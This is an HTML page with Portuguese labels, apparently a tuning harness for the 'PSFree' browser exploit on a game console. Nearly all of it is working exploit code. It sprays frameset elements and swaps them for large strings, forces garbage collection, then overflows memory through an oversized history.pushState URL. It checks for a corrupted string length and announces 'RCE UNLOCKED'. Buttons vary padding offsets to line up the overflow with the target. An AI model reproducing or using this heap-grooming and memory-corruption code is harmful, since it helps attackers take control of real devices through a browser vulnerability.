<!DOCTYPE html>
<html>
<head>
    <title>PSFree Tuning: Vítima +Padding</title>
    <style>
        body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #00ff00; background: #111; color: #fff; cursor: pointer; margin-bottom: 20px; }
        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
        .win { background-color: #00ff00; color: #000; font-weight: bold; font-size: 1.5em; padding: 10px; border: 4px solid white; }
    </style>
</head>
<body>

    <h1>PSFree Tuning: Aumentar Vítima</h1>
    <p>Aumentando o tamanho da string para alinhar o Header com o tiro.</p>

    <button onclick="startTuning(0)">1. Padrão (Sucesso Parcial)</button>
    <button onclick="startTuning(8)">2. Aumentar +8 Bytes</button>
    <button onclick="startTuning(16)">3. Aumentar +16 Bytes</button>
    <button onclick="startTuning(24)">4. Aumentar +24 Bytes</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        const BASE_OFFSET = 709520; 
        const OVERFLOW_AMT = 1024 * 64; 

        // Base de 1MB
        const TARGET_SIZE = 1024 * 1024; 
        const BASE_PAYLOAD = TARGET_SIZE - 24; 

        var victims_fs = [];
        var victims_str = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'win' ? 'class="win"' : '';
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        async function startTuning(extraBytes) {
            // AQUI ESTÁ O TRUQUE:
            // Aumentamos o tamanho da string que vamos alocar.
            // Se o alocador tiver espaço, ele vai empurrar os dados para frente.
            let currentPayloadSize = BASE_PAYLOAD + extraBytes;
            
            // O Frameset precisa abrir um buraco desse tamanho novo
            // (Arredondado para 8 bytes)
            const targetTotal = TARGET_SIZE + extraBytes;
            const fsElements = Math.floor(targetTotal / 8) - 2;
            const fsRows = ",".repeat(fsElements);

            log(`--- TESTE COM +${extraBytes} BYTES (Total Payload: ${currentPayloadSize}) ---`);

            // 1. SPRAY FRAMESET
            victims_fs = [];
            const SPRAY_COUNT = 60;
            
            try {
                for(let i=0; i<SPRAY_COUNT; i++) {
                    let fset = document.createElement('frameset');
                    fset.rows = fsRows;
                    victims_fs.push(fset);
                }
            } catch(e) { log("Erro Spray: " + e.message); return; }

            // 2. SWAP (String TextDecoder)
            let rawBuffer = new Uint8Array(currentPayloadSize);
            rawBuffer.fill(0x42); 
            let decoder = new TextDecoder("utf-8");
            let baseString = decoder.decode(rawBuffer);

            victims_str = [];
            for(let i=0; i<SPRAY_COUNT; i+=2) {
                victims_fs[i].rows = ""; 
                victims_fs[i] = null;
                let s = i + "_" + baseString.substring((i+"_").length);
                victims_str.push(s);
            }

            await forceGC();

            // 3. EXPLOIT
            log("Disparando...");
            setTimeout(() => {
                try {
                    let buffer = "A".repeat(BASE_OFFSET);
                    buffer += "\x01".repeat(OVERFLOW_AMT);
                    history.pushState({}, "tuning", "/" + buffer);

                    checkCorruption(currentPayloadSize, extraBytes);
                } catch (e) { log("Erro: " + e.message); }
            }, 500);
        }

        function checkCorruption(expectedLen, extra) {
            let success = false;
            for(let i=0; i<victims_str.length; i++) {
                let s = victims_str[i];
                if(!s) continue;
                try {
                    let err = new Error(s);
                    let msg = err.message;

                    // SUCESSO (RCE)
                    if (msg.length !== expectedLen) {
                        log(`!!! JACKPOT !!! Length Corrompido com +${extra}!`, 'win');
                        log(`Novo Tamanho: ${msg.length}`, 'win');
                        alert("RCE UNLOCKED!");
                        success = true;
                        break;
                    }

                    // DADOS
                    if (msg.charCodeAt(0) !== 66) {
                         log(`[SINAL] Ainda em Dados com +${extra}. Tente aumentar mais.`, 'win');
                         success = true;
                         break;
                    }
                } catch(e) {}
            }
            if(!success) log(`Nada atingido com +${extra}.`);
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 800));
        }
    </script>
</body>
</html>
